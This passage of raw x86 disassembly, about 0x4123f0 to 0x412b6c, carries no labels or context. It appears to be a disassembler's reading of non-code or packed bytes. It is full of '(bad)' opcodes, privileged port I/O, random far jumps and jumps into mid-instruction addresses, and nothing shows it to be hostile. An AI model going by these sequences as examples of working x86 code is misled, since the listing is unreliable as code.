  4123f0:	lds    ebx,FWORD PTR [edi+0x22757cf]
  4123f6:	xor    ah,dh
  4123f8:	sahf   
  4123f9:	in     eax,0x92
  4123fb:	jns    0x412414
  4123fd:	ss pop ebx
  4123ff:	xchg   ecx,eax
  412400:	test   DWORD PTR [edi+ecx*2-0x18ae605a],0xca54a531
  41240b:	mov    edi,0xa252724
  412410:	rol    ecx,1
  412412:	jns    0x412460
  412414:	lock scas eax,DWORD PTR es:[edi]
  412416:	popf   
  412417:	push   edx
  412418:	jp     0x41242e
  41241a:	sbb    al,0x49
  41241c:	xchg   DWORD PTR [eax-0xe],ebp
  41241f:	jp     0x4123a4
  412421:	les    ecx,FWORD PTR [edx-0x17]
  412424:	jp     0x4123fa
  412426:	gs jo  0x4123bc
  412429:	out    dx,eax
  41242a:	mov    ds,WORD PTR [ecx+0x7a]
  41242d:	inc    bh
  41242f:	pushf  
  412430:	xchg   ebx,eax
  412431:	ret    0x6ba7
  412434:	adc    al,dl
  412436:	es jmp 0x66ad:0x3829797a
  41243e:	ds xor edx,ecx
  412441:	adc    eax,DWORD PTR [ebx-0x6d]
  412444:	scas   eax,DWORD PTR es:[edi]
  412445:	out    0xde,eax
  412447:	or     al,BYTE PTR ss:[edx+edx*2+0x5824be38]
  41244f:	pop    edi
  412450:	xor    BYTE PTR ds:0x359c9ecf,dh
  412456:	pop    ds
  412457:	mov    ebp,0x26c6ac
  41245c:	fnop   
  41245e:	sub    al,0xbc
  412460:	stc    
  412461:	fst    QWORD PTR [ebx-0x338f8f44]
  412467:	lock (bad) 
  412469:	pop    ebx
  41246a:	out    0x47,al
  41246c:	mov    esp,0x96e957ef
  412471:	fadd   DWORD PTR [edi+0x53]
  412474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412475:	aam    0x7b
  412477:	dec    ebx
  412478:	test   BYTE PTR [edx-0x10],bh
  41247b:	push   edx
  41247c:	and    BYTE PTR [ebx],0x1e
  41247f:	xchg   esp,eax
  412480:	lock nop
  412482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412483:	not    BYTE PTR [ecx+0x8]
  412486:	loope  0x412500
  412488:	sbb    al,0x0
  41248a:	jle    0x412494
  41248c:	push   ss
  41248d:	sbb    al,0xbb
  41248f:	or     BYTE PTR [esi+0x1c],bh
  412492:	pop    ds
  412493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412494:	and    BYTE PTR [ebx],dl
  412496:	fcomp  QWORD PTR [edi]
  412498:	xchg   ebx,eax
  412499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41249a:	lea    edx,[ebx+0x4e]
  41249d:	pop    es
  41249e:	dec    ebp
  41249f:	xchg   esp,eax
  4124a0:	mov    edi,0x36433d08
  4124a5:	add    al,0x24
  4124a7:	xlat   BYTE PTR ds:[ebx]
  4124a8:	pop    eax
  4124a9:	xchg   esp,eax
  4124aa:	fidivr DWORD PTR [esi-0x3e00b68e]
  4124b0:	lods   al,BYTE PTR ds:[esi]
  4124b1:	fs call 0x58df:0x3ec44e6e
  4124b9:	jmp    0x412457
  4124bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124bc:	pop    esp
  4124bd:	jnp    0x4124c7
  4124bf:	(bad)  
  4124c1:	cmp    dl,BYTE PTR [ecx]
  4124c3:	(bad)  
  4124c4:	(bad)  
  4124c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c6:	jge    0x412499
  4124c8:	jns    0x4124fb
  4124ca:	(bad)
  4124ce:	stc    
  4124cf:	sti    
  4124d0:	push   0xffffffc3
  4124d2:	jbe    0x4124de
  4124d4:	or     ah,BYTE PTR [ecx]
  4124d6:	jnp    0x4124bd
  4124d8:	sub    edi,DWORD PTR [esi]
  4124da:	jns    0x41253b
  4124dc:	jb     0x41250c
  4124de:	and    al,0x94
  4124e0:	jae    0x4124e0
  4124e2:	pushf  
  4124e3:	cwde   
  4124e4:	sub    DWORD PTR [ebx],edx
  4124e6:	xor    ebx,ebx
  4124e8:	xchg   esi,eax
  4124e9:	mov    ds:0xf41e909a,al
  4124ee:	jnp    0x4124e0
  4124f0:	mov    esi,0x511a6ca5
  4124f5:	xchg   dh,al
  4124f7:	aas    
  4124f8:	push   esi
  4124f9:	cmp    eax,0x10f81935
  4124fe:	mov    ecx,0xcdd69cae
  412503:	mov    esp,0x9d91b54b
  412508:	xor    ah,BYTE PTR [ebp+0x5b]
  41250b:	repnz fimul WORD PTR [ecx+edx*4-0x4e]
  412510:	js     0x412581
  412512:	fidiv  DWORD PTR ds:0xe5d69276
  412518:	mov    ah,0x40
  41251a:	lods   eax,DWORD PTR ds:[esi]
  41251b:	cwde   
  41251c:	push   ebx
  41251d:	add    DWORD PTR [esi+0x4081d6c0],0xdb1b8d93
  412527:	sub    DWORD PTR [edi],edi
  412529:	loop   0x4124c6
  41252b:	ret    0xdf1a
  41252e:	and    ebx,edx
  412530:	jmp    0xd3ce:0xffc4b970
  412537:	repnz sub bl,dl
  41253a:	pop    ecx
  41253b:	push   cs
  41253c:	pop    esi
  41253d:	pop    ecx
  41253e:	mov    ebp,0x4dfd55ab
  412543:	retf   0xb958
  412546:	cmp    DWORD PTR [ebx-0x2676b452],edi
  41254c:	or     BYTE PTR [ecx-0x7],dh
  41254f:	add    eax,0x1711a66e
  412554:	lods   al,BYTE PTR ds:[esi]
  412555:	sar    DWORD PTR [ebx-0x59097e83],cl
  41255b:	mov    ebx,ecx
  41255d:	dec    ecx
  41255e:	ds xchg edx,eax
  412560:	adc    eax,0xb425bda7
  412565:	cwde   
  412566:	(bad)  
  412567:	lock or eax,0x15f242b5
  41256d:	add    esi,DWORD PTR [edi-0x4bd7b253]
  412573:	lods   eax,DWORD PTR ds:[esi]
  412574:	mov    bh,BYTE PTR [ebp+0xa]
  412577:	inc    esi
  412578:	ins    DWORD PTR es:[edi],dx
  412579:	sti    
  41257a:	xchg   edi,eax
  41257b:	das    
  41257c:	cmp    DWORD PTR [ebp+0x4a11ee94],0xffffffd2
  412583:	ja     0x41257c
  412585:	mov    esi,0xd647b4dd
  41258a:	mov    DWORD PTR [eax-0xc],ebp
  41258d:	jge    0x412574
  41258f:	cli    
  412590:	cli    
  412591:	dec    edx
  412592:	cwde   
  412593:	lods   eax,DWORD PTR ds:[esi]
  412594:	inc    edi
  412595:	retf   
  412596:	mov    edi,0x41f38702
  41259b:	aas    
  41259c:	xchg   ebp,eax
  41259d:	jno    0x4125f8
  41259f:	push   ds
  4125a0:	fsub   st(4),st
  4125a2:	int3   
  4125a3:	ret    0xa09d
  4125a6:	push   eax
  4125a7:	jb     0x412610
  4125a9:	xchg   BYTE PTR [esi],dl
  4125ab:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4125ad:	jge    0x4125ff
  4125af:	(bad)  
  4125b0:	inc    eax
  4125b1:	adc    ebx,ecx
  4125b3:	out    0x7a,al
  4125b5:	jo     0x4125f5
  4125b7:	mov    BYTE PTR [edi-0x5d6bdce2],bh
  4125bd:	pop    edi
  4125be:	sti    
  4125bf:	in     eax,dx
  4125c0:	in     eax,dx
  4125c1:	jmp    DWORD PTR [edx]
  4125c3:	daa    
  4125c4:	out    0xb1,eax
  4125c6:	push   edi
  4125c7:	sbb    al,0xde
  4125c9:	inc    esi
  4125ca:	jbe    0x41257f
  4125cc:	out    0xb0,eax
  4125ce:	sub    eax,0x80b30a25
  4125d3:	stos   DWORD PTR es:[edi],eax
  4125d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125d5:	ja     0x41263d
  4125d7:	mov    eax,ds:0x8d788917
  4125dc:	push   ebx
  4125dd:	sbb    ecx,DWORD PTR [ecx+0x6b]
  4125e0:	test   al,0x86
  4125e2:	pop    es
  4125e3:	or     al,ch
  4125e5:	stos   BYTE PTR es:[edi],al
  4125e6:	popa   
  4125e7:	push   esi
  4125e8:	ins    DWORD PTR es:[edi],dx
  4125e9:	imul   DWORD PTR [ebp+0x140578bd]
  4125ef:	mov    bl,0x67
  4125f1:	push   ebp
  4125f2:	lahf   
  4125f3:	fld    DWORD PTR [ecx+esi*4]
  4125f6:	mov    BYTE PTR [esi-0x9],bh
  4125f9:	cdq    
  4125fa:	jg     0x41260d
  4125fc:	cld    
  4125fd:	adc    eax,0xe3cfa424
  412602:	mov    ecx,0x501d6cf4
  412607:	ja     0x412634
  412609:	push   ecx
  41260a:	out    dx,al
  41260b:	sub    eax,0xdb549bd9
  412610:	ds iret 
  412612:	scas   eax,DWORD PTR es:[edi]
  412613:	test   BYTE PTR [edx],dl
  412615:	in     eax,dx
  412616:	xor    esi,ecx
  412618:	mov    ah,ch
  41261a:	shl    DWORD PTR [edi],1
  41261c:	mov    DWORD PTR [esi],edx
  41261e:	popf   
  41261f:	ret    
  412620:	pop    es
  412621:	dec    edx
  412622:	ss push ds
  412624:	icebp  
  412625:	mov    eax,ds:0x4411d7d7
  41262a:	(bad)  
  41262b:	(bad)  
  41262c:	stos   BYTE PTR es:[edi],al
  41262d:	mov    al,es:0x85b265f8
  412633:	bound  ebp,QWORD PTR [edi+0x19]
  412636:	sub    DWORD PTR [ecx+0x2e6c2cdc],eax
  41263c:	jbe    0x41266c
  41263e:	xchg   BYTE PTR [edx-0x371f32fe],dl
  412644:	ds push esp
  412646:	push   ebx
  412647:	imul   ebx,DWORD PTR [esi-0x76d3f7d3],0x31
  41264e:	ins    BYTE PTR es:[edi],dx
  41264f:	or     ecx,DWORD PTR [edi+0x57]
  412652:	bound  edx,QWORD PTR [esi+0x58]
  412655:	out    0xf8,al
  412657:	adc    eax,0x7155c7d5
  41265c:	cmp    bh,BYTE PTR [ebp+0x5c]
  41265f:	mov    BYTE PTR [edi-0xd8e0680],bl
  412665:	mov    edi,0x3da142d2
  41266a:	dec    ecx
  41266b:	lds    eax,FWORD PTR [eax+esi*8+0xbe666a]
  412672:	out    0x8a,eax
  412674:	xchg   BYTE PTR [ebp-0x60],bh
  412677:	call   0xf7a95ebd
  41267c:	pop    es
  41267d:	mov    dl,0x61
  41267f:	sub    bh,BYTE PTR [ebp+0x7f0a3ef3]
  412685:	(bad)  
  412686:	in     eax,0x37
  412688:	shl    BYTE PTR [esi],cl
  41268a:	add    esi,esp
  41268c:	aaa    
  41268d:	(bad)
  412690:	sbb    edi,DWORD PTR [bp+di-0x67c1]
  412695:	addr16 daa 
  412697:	dec    ebp
  412698:	les    eax,FWORD PTR [ecx+0x28]
  41269b:	jbe    0x41262d
  41269d:	loopne 0x4126dd
  41269f:	pop    es
  4126a0:	lahf   
  4126a1:	(bad)  
  4126a2:	xor    eax,0xa06e7fb9
  4126a7:	push   edx
  4126a8:	inc    edi
  4126a9:	cmp    BYTE PTR [ebx-0x12],0x5f
  4126ad:	sar    BYTE PTR [edx+ecx*1-0x728c8646],0x8f
  4126b5:	mov    WORD PTR [ebx+0xe],es
  4126b8:	data16 jbe 0x41272b
  4126bb:	and    cl,BYTE PTR [ecx+0xf37b0e0]
  4126c1:	jb     0x4126b8
  4126c3:	lods   eax,DWORD PTR ds:[esi]
  4126c4:	jmp    0x82e7:0xa5342f22
  4126cb:	loope  0x412657
  4126cd:	js     0x412667
  4126cf:	cmc    
  4126d0:	xchg   ebp,eax
  4126d1:	in     eax,0xc2
  4126d3:	xor    al,0xbd
  4126d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d6:	mov    ds:0xac80f119,eax
  4126db:	mov    ebp,0x9976b972
  4126e0:	outs   dx,BYTE PTR ds:[esi]
  4126e1:	aam    0x44
  4126e3:	rcl    ecx,1
  4126e5:	add    ecx,eax
  4126e7:	aaa    
  4126e8:	pop    ss
  4126e9:	jg     0x41269a
  4126eb:	dec    eax
  4126ec:	out    0x88,al
  4126ee:	lods   al,BYTE PTR ds:[esi]
  4126ef:	push   ebp
  4126f0:	mov    dh,0x77
  4126f2:	sbb    ebp,DWORD PTR [ecx-0x6544b5dd]
  4126f8:	imul   ebx,DWORD PTR [edx+edi*2-0x56],0x57
  4126fd:	mov    ecx,0x3c510e
  412702:	loope  0x4126b7
  412704:	retf   
  412705:	in     eax,dx
  412706:	pop    ecx
  412707:	ficomp DWORD PTR [esi-0x7ec76d85]
  41270d:	outs   dx,DWORD PTR ds:[esi]
  41270e:	shl    BYTE PTR [edi+0x10],cl
  412711:	sub    eax,0xdefeb02f
  412716:	loop   0x412717
  412718:	mov    ch,0x2a
  41271a:	cmp    al,0x68
  41271c:	jae    0x412795
  41271e:	sbb    edx,DWORD PTR [edi]
  412720:	adc    ah,BYTE PTR [ebx+0x60]
  412723:	inc    ebx
  412724:	sti    
  412725:	push   cs
  412726:	xlat   BYTE PTR ds:[ebx]
  412727:	ja     0x412714
  412729:	test   DWORD PTR [ebp-0xc9003ac],ebx
  41272f:	or     eax,0xceaf875d
  412734:	add    dh,BYTE PTR [ecx+eiz*2]
  412737:	inc    eax
  412738:	mov    dl,0xe1
  41273a:	pusha  
  41273b:	jnp    0x4126c4
  41273d:	and    eax,0xe8e65a94
  412742:	in     eax,dx
  412743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412744:	in     eax,0x48
  412746:	add    al,0xb2
  412748:	pop    ebx
  412749:	adc    esp,DWORD PTR [ebx]
  41274b:	les    eax,FWORD PTR [esi-0x6b589a77]
  412751:	in     eax,dx
  412752:	sahf   
  412753:	mov    bl,0xcc
  412755:	cmp    DWORD PTR [esi],ebp
  412757:	arpl   WORD PTR [esi+0x2b],dx
  41275a:	or     eax,0xd2c9286b
  41275f:	nop
  412760:	retf   0xe0a3
  412763:	mov    dl,BYTE PTR [eax+0x32]
  412766:	push   edi
  412767:	jno    0x412755
  412769:	xchg   ebp,ebx
  41276b:	xor    DWORD PTR [ebp+eiz*2+0x25509f81],0xffffffb4
  412773:	mov    DWORD PTR [edx],edi
  412775:	shr    BYTE PTR [edi-0x70],0x11
  412779:	cmp    DWORD PTR [eax+esi*1],esi
  41277c:	xlat   BYTE PTR ds:[ebx]
  41277d:	mov    al,0x81
  41277f:	scas   eax,DWORD PTR es:[edi]
  412780:	mov    cs,edi
  412782:	scas   al,BYTE PTR es:[edi]
  412783:	int    0x9d
  412785:	popa   
  412786:	les    edi,FWORD PTR [edi+0x5e]
  412789:	outs   dx,BYTE PTR ds:[esi]
  41278a:	mov    ds:0x776226c8,eax
  41278f:	stos   DWORD PTR es:[edi],eax
  412790:	stc    
  412791:	pusha  
  412792:	js     0x412811
  412794:	test   DWORD PTR [edi+0x3fc5690e],edi
  41279a:	or     BYTE PTR [ebp+0x4],bh
  41279d:	sub    bl,BYTE PTR [ebx]
  41279f:	pop    eax
  4127a0:	push   ecx
  4127a1:	push   edx
  4127a2:	dec    edi
  4127a3:	dec    ecx
  4127a4:	fcmovb st,st(1)
  4127a6:	mov    bh,bh
  4127a8:	and    eax,0x15b8334a
  4127ad:	or     BYTE PTR [ecx-0x56],al
  4127b0:	sub    edi,DWORD PTR ds:0x333b28f7
  4127b6:	jg     0x412753
  4127b8:	scas   eax,DWORD PTR es:[edi]
  4127b9:	mov    ebp,0xfff75492
  4127be:	jp     0x41282e
  4127c0:	jb     0x412758
  4127c2:	and    eax,0xd5e74301
  4127c7:	ds push esi
  4127c9:	inc    edx
  4127ca:	stc    
  4127cb:	xchg   ebp,eax
  4127cc:	cmc    
  4127cd:	arpl   sp,di
  4127cf:	outs   dx,DWORD PTR ds:[esi]
  4127d0:	jecxz  0x412811
  4127d2:	test   DWORD PTR [ebx+0xf1246a8],edi
  4127d8:	lds    esi,FWORD PTR [ecx]
  4127da:	imul   ebp,DWORD PTR [esi+eiz*1],0x31
  4127de:	(bad)  
  4127df:	hlt    
  4127e0:	fstp   DWORD PTR [eax-0x31]
  4127e3:	adc    bh,BYTE PTR [edi+0x32]
  4127e6:	xor    al,0xe9
  4127e8:	sub    ecx,ecx
  4127ea:	ins    BYTE PTR es:[edi],dx
  4127eb:	push   edi
  4127ec:	not    DWORD PTR [ecx+0x1376c75]
  4127f2:	xor    esp,esp
  4127f4:	int    0xd5
  4127f6:	retf   
  4127f7:	aaa    
  4127f8:	dec    edi
  4127f9:	mov    edx,esp
  4127fb:	xlat   BYTE PTR ds:[ebx]
  4127fc:	jnp    0x412815
  4127fe:	test   BYTE PTR [esi],ah
  412800:	stos   BYTE PTR es:[edi],al
  412801:	pop    ebx
  412802:	lds    ecx,FWORD PTR [ebp+0x19c07e5c]
  412808:	and    ecx,ebp
  41280a:	push   esi
  41280b:	imul   ebx,DWORD PTR ds:0x5999e26c,0xffffffac
  412812:	lock out dx,eax
  412814:	(bad)  
  412815:	mov    eax,0xa9a757fa
  41281a:	cmp    edi,edi
  41281c:	and    al,0x4b
  41281e:	fistp  DWORD PTR [edx+0x15e2d6f2]
  412824:	or     ch,dh
  412826:	pop    esi
  412827:	jb     0x412894
  412829:	aam    0x8a
  41282b:	cmc    
  41282c:	cmp    BYTE PTR [ecx],bl
  41282e:	es test esi,ebp
  412831:	and    eax,0xa6ef1ba
  412836:	test   BYTE PTR [edi-0xd],0xa8
  41283a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41283b:	xor    DWORD PTR [ebx+ebx*1-0x3c2b4eb9],ebp
  412842:	xor    BYTE PTR [esi],ah
  412844:	mov    al,0x99
  412846:	sub    DWORD PTR [edi],ecx
  412848:	rol    edx,0xe0
  41284b:	mov    ds:0x2ed187ab,al
  412850:	push   cs
  412851:	lahf   
  412852:	push   es
  412853:	fist   DWORD PTR [esi-0x7c]
  412856:	jnp    0x4128b2
  412858:	dec    eax
  412859:	push   eax
  41285a:	scas   eax,DWORD PTR es:[edi]
  41285b:	xor    dh,BYTE PTR [eax-0xc]
  41285e:	call   0x2b765fb4
  412863:	inc    esi
  412864:	dec    edx
  412865:	and    edx,DWORD PTR [ecx+ebx*1+0x2c]
  412869:	outs   dx,BYTE PTR ds:[esi]
  41286a:	call   0x38f72cc4
  41286f:	leave  
  412870:	dec    edx
  412871:	and    al,0xa7
  412873:	ss inc edi
  412875:	iret   
  412876:	sbb    dl,dl
  412878:	outs   dx,DWORD PTR ds:[esi]
  412879:	and    al,0xea
  41287b:	dec    ebp
  41287c:	pusha  
  41287d:	pop    edi
  41287e:	stos   BYTE PTR es:[edi],al
  41287f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412880:	outs   dx,BYTE PTR ds:[esi]
  412881:	mov    ebx,0x4ee84c7c
  412886:	inc    esi
  412887:	adc    al,0x3c
  412889:	test   DWORD PTR [esp+eax*2-0x11],esp
  41288d:	mov    ah,0x32
  41288f:	mov    ah,0x6e
  412891:	or     eax,DWORD PTR [ecx-0x70a6b168]
  412897:	jp     0x412825
  412899:	cmp    bh,ch
  41289b:	in     eax,0xe
  41289d:	stc    
  41289e:	frstor fs:[ebx+ecx*8]
  4128a2:	es or  al,0x41
  4128a5:	or     al,0xf8
  4128a7:	xchg   ebp,eax
  4128a8:	iret   
  4128a9:	push   edi
  4128aa:	mov    al,ds:0xcbf1f7e6
  4128af:	(bad)  
  4128b0:	jmp    0x73e9f488
  4128b5:	jmp    0xe2ff8543
  4128ba:	das    
  4128bb:	call   0x9a92:0x9cae4c85
  4128c2:	inc    ecx
  4128c3:	and    esp,DWORD PTR [esi-0x76]
  4128c6:	in     eax,0x34
  4128c8:	push   ebx
  4128c9:	aam    0xaf
  4128cb:	inc    ebx
  4128cc:	cmp    ecx,edx
  4128ce:	into   
  4128cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d0:	pop    edx
  4128d1:	jp     0x41294c
  4128d3:	and    bl,BYTE PTR ds:0x3e795e23
  4128d9:	inc    eax
  4128da:	push   cs
  4128db:	xchg   edi,eax
  4128dc:	jno    0x4128b2
  4128de:	loope  0x412900
  4128e0:	lds    esi,FWORD PTR [edx]
  4128e2:	add    DWORD PTR [ebp-0x7f],edi
  4128e5:	cmp    al,BYTE PTR [esi]
  4128e7:	add    eax,0xf624bb72
  4128ec:	dec    eax
  4128ed:	add    eax,0x47f01804
  4128f2:	mov    esi,0xa73ce13a
  4128f7:	lea    edx,[esi]
  4128f9:	or     DWORD PTR [esi+0x1d0c17d3],0x6da54423
  412903:	sbb    ebx,DWORD PTR [eax-0x1d2605f6]
  412909:	sbb    esi,DWORD PTR [ebx+0x76]
  41290c:	icebp  
  41290d:	cli    
  41290e:	(bad)  
  41290f:	(bad)  
  412910:	pop    esp
  412911:	inc    ecx
  412912:	sub    dh,BYTE PTR [esi+0x1a]
  412915:	xor    BYTE PTR ds:0x504e9376,0x57
  41291c:	add    al,0xb9
  41291e:	dec    ebp
  41291f:	gs mov ecx,0xe832440c
  412925:	xchg   esi,eax
  412926:	bound  edx,QWORD PTR [ecx-0x23]
  412929:	cld    
  41292a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41292b:	jbe    0x4128c9
  41292d:	jnp    0x412985
  41292f:	lahf   
  412930:	add    eax,0x8882e27a
  412935:	cmp    ebx,DWORD PTR [ecx-0x65450809]
  41293b:	and    al,0x9d
  41293d:	mov    WORD PTR [eax+0x23],ds
  412940:	out    0xe1,eax
  412942:	sbb    DWORD PTR [eax-0x18],ecx
  412945:	inc    edi
  412946:	dec    eax
  412947:	gs inc edx
  412949:	sub    bh,cl
  41294b:	sbb    BYTE PTR [esi+0x5b],cl
  41294e:	xchg   edi,eax
  41294f:	loop   0x412978
  412951:	push   edx
  412952:	mov    bh,0xeb
  412954:	aad    0x56
  412956:	out    0x16,al
  412958:	aas    
  412959:	and    al,0x86
  41295b:	iret   
  41295c:	into   
  41295d:	sbb    DWORD PTR [ebp+eax*4-0x4c],0x7baf8455
  412965:	test   DWORD PTR [esi-0x13ae6423],esi
  41296b:	aaa    
  41296c:	ret    
  41296d:	jmp    0x41293a
  41296f:	xor    eax,0xdc8faff
  412974:	repz xchg edi,eax
  412976:	mov    ecx,0x6e09f4cf
  41297b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41297c:	sub    al,BYTE PTR [edx-0x15353f81]
  412982:	mov    cl,0x81
  412984:	or     DWORD PTR [ebx-0x22],ebp
  412987:	push   edi
  412988:	xor    BYTE PTR es:[ecx-0x73],cl
  41298c:	adc    BYTE PTR [ebp+0x4cbdf3c3],0xfd
  412993:	xchg   edi,eax
  412994:	imul   ebx,edi,0x15
  412997:	pop    ebx
  412998:	or     BYTE PTR [ecx],0xe0
  41299b:	xchg   BYTE PTR [eax+0x2a5e73d7],dl
  4129a1:	or     ecx,DWORD PTR [ebp+ebp*8+0x40]
  4129a5:	mov    al,ds:0x63c1738a
  4129aa:	xchg   BYTE PTR [edx-0x2e],dh
  4129ad:	sbb    bh,BYTE PTR [edx-0x44]
  4129b0:	std    
  4129b1:	test   eax,0x77781a23
  4129b6:	not    DWORD PTR [ebp-0x41]
  4129b9:	rol    DWORD PTR [edi+0x77],cl
  4129bc:	xchg   ecx,eax
  4129bd:	sub    al,bh
  4129bf:	ja     0x412a3b
  4129c1:	pop    eax
  4129c2:	inc    edx
  4129c3:	cmp    edi,esi
  4129c5:	jl     0x412a1c
  4129c7:	mov    BYTE PTR [edx+0x58785373],bh
  4129cd:	stos   BYTE PTR es:[edi],al
  4129ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129cf:	or     al,BYTE PTR [ebx+0x31]
  4129d2:	inc    ebx
  4129d3:	xchg   BYTE PTR [ecx],bh
  4129d5:	cmp    al,0x1b
  4129d7:	into   
  4129d8:	jno    0x4129a7
  4129da:	pop    edx
  4129db:	mov    bl,0x6f
  4129dd:	fcmovnbe st,st(3)
  4129df:	cs repnz sbb eax,0x6385ee48
  4129e6:	in     eax,dx
  4129e7:	dec    eax
  4129e8:	dec    edi
  4129e9:	and    eax,0x1a0aad12
  4129ee:	das    
  4129ef:	add    dl,ah
  4129f1:	pop    es
  4129f2:	outs   dx,BYTE PTR ds:[esi]
  4129f3:	pop    eax
  4129f4:	mov    DWORD PTR [esi+0xa],ebp
  4129f7:	mov    eax,ds:0x78883383
  4129fc:	and    DWORD PTR [ebx+ebp*4+0x40f119e2],esi
  412a03:	gs ds push ebx
  412a06:	cmp    eax,0x13203ad0
  412a0b:	in     al,0xa5
  412a0d:	mov    WORD PTR [edi+0x30],fs
  412a10:	hlt    
  412a11:	adc    BYTE PTR [ecx+0x14],bl
  412a14:	mov    ebx,0x6297bbc2
  412a19:	pop    ebp
  412a1a:	xor    eax,0x8fb15b9
  412a1f:	sub    edx,edx
  412a21:	pop    DWORD PTR [ecx-0x61b63bca]
  412a27:	sbb    eax,0xe1dbc9d9
  412a2c:	cmp    ebp,DWORD PTR [ebp-0x3aec08c2]
  412a32:	pop    esi
  412a33:	push   eax
  412a34:	imul   ecx,DWORD PTR [ebp+0x7d],0xffffffa5
  412a38:	jmp    0x4129c6
  412a3a:	iret   
  412a3b:	inc    ebp
  412a3c:	cmp    ebp,edx
  412a3e:	cdq    
  412a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a40:	mov    ecx,0x92b515c0
  412a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a46:	(bad)  
  412a47:	jb     0x412a99
  412a49:	push   ds
  412a4a:	mov    ds:0x27b2b5db,al
  412a4f:	cmp    bl,BYTE PTR [edx+0x6d19613e]
  412a55:	aas    
  412a56:	push   edx
  412a57:	(bad)  
  412a58:	xchg   edx,eax
  412a59:	lahf   
  412a5a:	adc    bh,ch
  412a5c:	ret    0x8128
  412a5f:	jg     0x412a0a
  412a61:	iret   
  412a62:	ret    
  412a63:	xchg   edi,eax
  412a64:	xor    BYTE PTR gs:[ebx],dl
  412a67:	ins    BYTE PTR es:[edi],dx
  412a68:	jnp    0x412a01
  412a6a:	jge    0x412adf
  412a6c:	sti    
  412a6d:	or     BYTE PTR [ebx-0x29df5030],bh
  412a73:	mov    esp,0x56aaa30c
  412a78:	xor    esi,DWORD PTR [esi+0x25]
  412a7b:	out    dx,al
  412a7c:	(bad)  
  412a7d:	stc    
  412a7e:	cmc    
  412a7f:	and    eax,0x702daa2d
  412a84:	dec    eax
  412a85:	push   es
  412a86:	push   eax
  412a87:	sub    cl,BYTE PTR [ecx]
  412a89:	xor    BYTE PTR [edx],0x55
  412a8c:	jmp    0x412a39
  412a8e:	mov    eax,ds:0x3173c89c
  412a93:	xor    ebx,edi
  412a95:	lds    edi,FWORD PTR [edx]
  412a97:	out    0x31,eax
  412a99:	gs (bad) 
  412a9b:	out    dx,al
  412a9c:	push   cs
  412a9d:	arpl   WORD PTR [ebp+edx*2+0x7f],bp
  412aa1:	mov    bh,0x9b
  412aa3:	(bad)  
  412aa4:	jns    0x412a4d
  412aa6:	repz add ch,BYTE PTR [esi]
  412aa9:	jmp    0x395c9a71
  412aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412aaf:	cmp    DWORD PTR [ebx-0x6f],esi
  412ab2:	jb     0x412ad8
  412ab4:	cmp    ecx,DWORD PTR [ebx+0x43ae4704]
  412aba:	and    bh,BYTE PTR [edi-0x424d9b77]
  412ac0:	add    al,0xab
  412ac2:	shl    DWORD PTR [ecx],1
  412ac4:	add    al,0x85
  412ac6:	mov    DWORD PTR [ebx+0x242818d9],edx
  412acc:	ja     0x412a53
  412ace:	jb     0x412b05
  412ad0:	cdq    
  412ad1:	xor    ebp,DWORD PTR [ebp-0x70e3e262]
  412ad7:	or     BYTE PTR [esi+0x704f9b38],0x9d
  412ade:	jmp    0x27a4:0x78fa5485
  412ae5:	pop    esp
  412ae6:	sbb    eax,0x7662ddb3
  412aeb:	loope  0x412a9a
  412aed:	inc    ebx
  412aee:	test   al,0x57
  412af0:	pop    ds
  412af1:	mov    esp,0xbc7dda8f
  412af6:	jle    0x412afb
  412af8:	out    dx,al
  412af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412afa:	inc    edx
  412afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412afc:	cmp    al,0xdd
  412afe:	enter  0xccf6,0xee
  412b02:	pushf  
  412b03:	xchg   edi,eax
  412b04:	fidiv  DWORD PTR [edi+0x0]
  412b07:	mov    edi,0x96abe73f
  412b0c:	push   cs
  412b0d:	cmp    al,0xd7
  412b0f:	aaa    
  412b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b11:	jne    0x412b39
  412b13:	adc    eax,0xe14dd263
  412b18:	or     DWORD PTR [ebx],0x2b
  412b1b:	mov    bl,0x88
  412b1d:	mov    al,ds:0x6b9af5d1
  412b22:	scas   eax,DWORD PTR es:[edi]
  412b23:	adc    dh,cl
  412b25:	push   ss
  412b26:	or     ah,BYTE PTR [ecx+0x4f721fd0]
  412b2c:	hlt    
  412b2d:	sub    al,0x9a
  412b2f:	pushw  ss
  412b31:	adc    DWORD PTR [ebx-0xe7eb130],eax
  412b37:	jo     0x412b9d
  412b39:	jne    0x412bb6
  412b3b:	inc    edi
  412b3c:	call   0x97f1:0xd3d5c372
  412b43:	out    0x8f,al
  412b45:	inc    esp
  412b46:	rcl    DWORD PTR [ebp-0x724ace1d],cl
  412b4c:	xor    ch,BYTE PTR [edi]
  412b4e:	mov    ebx,0x621d4043
  412b53:	aas    
  412b54:	movaps XMMWORD PTR [esp+ebx*2+0x5f261a78],xmm0
  412b5c:	mov    dl,0xe7
  412b5e:	outs   dx,BYTE PTR ds:[esi]
  412b5f:	js     0x412b6d
  412b61:	popf   
  412b62:	add    BYTE PTR [esi+0x26],ch
  412b65:	repnz cmp ch,BYTE PTR ds:[edi]
  412b69:	or     al,0x14
  412b6b:	push   eax
  412b6c:	imul   DWORD PTR [ebp+ebx*4-0x3]
